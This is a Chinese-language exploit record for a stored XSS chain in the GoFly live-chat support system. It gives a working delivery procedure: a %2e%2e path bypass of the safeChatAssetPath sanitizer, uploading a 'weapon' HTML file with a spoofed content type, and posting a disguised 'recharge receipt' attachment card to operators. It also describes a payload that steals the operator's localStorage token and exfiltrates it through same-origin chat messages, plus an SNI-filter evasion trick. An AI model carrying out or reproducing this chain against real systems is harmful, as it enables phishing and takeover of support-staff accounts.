# GoFly 客服附件卡片 safeChatAssetPath(%2e%2e) 绕过 → 同源存储型 XSS 主动投递链

- **code**: gofly-attach-card-safechatassetpath-bypass-xss-delivery
- **kind**: script
- **category**: file-upload
- **component**: GoFly / goflylivechat 二开版 (客服系统)
- **severity**: high
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: 2026-10-16 在 example.com(源站 203.0.113.95) 实测：POST /2/message(Bearer supportToken, content 含 attachment[path=.../%2e%2e/.../6ad21ee7edf97_1435.html], to_id=agent) => {"code":200,"msg":"ok"}，/2/messagesPages 回读落库 id=16413(status=unread)；真 functions.js 渲染出 <a href="/static/upload/%2e%2e/...html" class="productCard">充值单据.html</a> 解析到 https://example.com/uploads/.../6ad21ee7edf97_1435.html(200 text/html)；真 headless Chrome 隔离 harness 回显 KEFUMESSAGE tok=FAKE_OPERATOR_TOKEN_ABC123 content=LEAK|...，decoded 含 localStorage['token']=FAKE_OPERATOR_TOKEN_ABC123。
- **path**: pocs/gofly-attach-card-safechatassetpath-bypass-xss-delivery/poc.md
- **tags**: gofly,kefu,xss,stored-xss,file-upload,sanitizer-bypass,phishing,same-origin
- **created_at**: 2026-10-16T13:00:24.996Z
- **found_by**: exploit

## 描述

GoFly 客服前端 safeChatAssetPath 只拦字面 ".."、不 URL 解码，附件卡片路径用 %2e%2e 绕过同源/目录限制，可把指向任意上传 .html 的可点击卡片投进运营/客服公共会话，实现同源存储型 XSS 的主动、可伪装投递（充值单据/对账单钓鱼）。

## 用法

```
1) 会员登录取 supportToken(API /api/v1/support/session)；2) 任意扩展名上传武器 .html 到 /uploads；3) POST /2/message content=attachment[{path:"/static/upload/%2e%2e/%2e%2e/uploads/.../w.html",name:"充值单据.html",ext:".html"}]&to_id=agent 投递；4) 客服点击后武器读 localStorage['token'] 并用其 token POST /kefu/message 回传给攻击者 visitor；5) 攻击者 GET /2/messagesPages?reader=visitor 收 LEAK。同 webroot SNI 过滤时用 --resolve+Host 技巧。
```

## 正文

```
# GoFly 客服 附件卡片 safeChatAssetPath 绕过 → 同源存储型 XSS 主动投递

## 适用条件
- 目标跑 GoFly(taoshihan1991) 或二开版客服系统，运营/操作员面板以 Vue v-html 渲染访客消息里的附件卡片（`/chat_main` 的 `<div class="chatContent" v-html="v.content">`）。
- 存在任意会员可自助注册/登录，且可 `POST /api/v1/support/session` 取绑定自己 uid 的 supportToken（或任何能向 `to_id=agent` 发消息的访客通道）。
- 同 webroot 下 `/uploads/**`（或任何用户可控上传目录）以 text/html 原样返回（无 CSP）。

## 判据
1. 拉 `/static/js/functions.js`，看 `safeChatAssetPath()`：`if (!/^\/static\/upload\/[A-Za-z0-9_./%+-]+$/.test(path)) return ''; if (path.indexOf('..')!==-1||path.indexOf('//')!==-1) return '';` —— **只查字面 `..`，不 decodeURIComponent**，故 `%2e%2e` 绕过；`%25`(编码的%)不在正则字符类外也能过。
2. `replaceContent()` 用 `tokenPattern=/(face\[..\]|img\[..\]|attachment\[\{.*?\}\])/g` 提取，附件走 `renderAttachment(info, baseUrl+attachmentPath)` 输出 `<a href="...">…卡片…</a>`；baseUrl 运营页调用时为空 → 相对 href，浏览器按当前 origin 解析。
3. 服务端 nginx 会把 `/static/upload/%2e%2e/%2e%2e/uploads/...` 归一化为 `/uploads/...`，直接命中上传落地文件。

## 利用步骤
1. 会员登录 → `POST /api/v1/support/session`(Bearer 会员JWT) → 解密(AES-CBC，密钥常在前端/sibling app)得 `supportToken`、`visitorId`。
2. 上传 .html 武器（任意扩展名 + 伪造 Content-Type，例：`POST /api/v1/withdraw/upload-qrcode -F 'file=@w.html;filename=x.html;type=image/jpeg'`）→ 得 `/uploads/qrcode/<date>/<rand>_<uid>.html`。
3. 投递卡片（唯一会员可达路径为访客 `/2/message`；客服端 `/kefu/message` 有 from_id/to_id 会话校验，普通会员不能用）：
```
POST https://<chat_host>/2/message   (Authorization: Bearer <supportToken>)
type=visitor
content=充值单据一直审核中,麻烦点开核对 attachment[{"path":"/static/upload/%2e%2e/%2e%2e/uploads/qrcode/<d>/<f>.html","name":"充值单据.html","ext":".html","size":2048}]
from_id=<visitorId>&to_id=agent
```
4. 操作员点卡片 → 在客服 origin 执行武器 .html。

## 回传武器（纯同源，无需外部监听/无需 TLS）
客服工作台 token 存 `localStorage['token']`，以 `token` 头发往 `/kefuinfo`、`/visitors`、`/kefu/message`。
武器要点：读 localStorage → 同源 `GET /kefuinfo` 带 token 头拿自己 id(绕过 to_id 会话限制) → 同源 `POST /kefu/message` 用**客服自己的 token** 把 `content=LEAK|<base64>` 发给 `to_id=<攻击者 visitorId>`。攻击者用自己的 supportToken 调 `GET /2/messagesPages?visitor_id=...&reader=visitor` 读到 LEAK 即得客服 token。
（比外带 image beacon 更稳：https 页面的 http 外带会被 mixed-content 拦。）

## 坑 / 边界
- 不自动执行：面板对文本/事件内容有 escapeChatHtml；所有 v-html 点来源均经 replaceContent/escapeChatHtml，**仅附件卡片链接可达执行**，必须操作员点击。概率点击型钓鱼。
- 客服面板接口不接受会员/访客令牌（`{"code":400,"msg":"token失效"}`）；客服登录常需 账号+图形验证码+Google OTP。
- 平台出口若对 chat 域名直连 SNI 被过滤，用 `--resolve <可过SNI的域名>:443:<源站IP> -H 'Host: <chat域名>'`（同 webroot vhost 组）绕过。
- `/uploads` 可执行 vhost 上 `/app/admin/*` 常恒 404，不代表不能在该 origin 执行 JS。

## 已验证
2026-10 在 example.com(203.0.113.95) 实测：投递 200、落库 message id=16413；真 functions.js 渲染出卡片并解析到武器 .html(200 text/html)；真 headless Chrome 隔离 harness 证明武器在 origin 内读出 localStorage['token'] 并 POST /kefu/message。
```
